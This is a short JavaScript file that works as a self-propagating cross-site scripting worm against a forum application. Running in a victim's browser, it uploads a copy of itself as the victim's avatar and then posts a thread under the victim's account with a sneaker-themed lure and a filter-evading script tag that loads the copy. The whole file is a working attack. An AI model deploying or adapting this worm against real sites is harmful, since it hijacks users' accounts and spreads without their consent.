const {protocol, hostname, port} = window.location

const username = "username"

const postUrl = protocol + "//" + hostname + ":" + port + "/createThread?topic=discussion" 
const changeProfilePictureUrl = protocol + "//" + hostname + ":" + port + "/upload"
const payloadUrl = protocol + "//" + hostname + ":" + port + `/images/profileImages/${username}`

async function propagate(){
    const thisFile = await fetch(payloadUrl);
    const thisFileText = await thisFile.text();
    const myUsername = document.querySelector(".dropdown-toggle").getAttribute("title");
    if(myUsername == username || myUsername == null){
        return;
    }
    const usernameRegex = /(const username = )"([\w\d])"/
    const newPayload = thisFileText.replace(usernameRegex, `$1"${myUsername}"`)
    const formData = new FormData();
    formData.append("avatar", new Blob([newPayload], {type: "text/javascript"}), "payload.js");
    const response = await fetch(changeProfilePictureUrl, {
        method: "POST",
        body: formData
    })

    const newProfilePictureUrl = protocol + "//" + hostname + ":" + port + `/images/profileImages/${myUsername}`

    const xssPayload = `I got some new kicks at the kicks store. Don't know how to post images on here sorry! <scr<scriptipt src="${newProfilePictureUrl}"></script>`

    const createThreadData = `subject=New+kicks&body=${encodeURIComponent(xssPayload)}`

    const postResponse = await fetch(postUrl, {
        headers: {
            "Content-Type": "application/x-www-form-urlencoded"
        },
        method: "POST",
        body: createThreadData
    })

}

propagate();
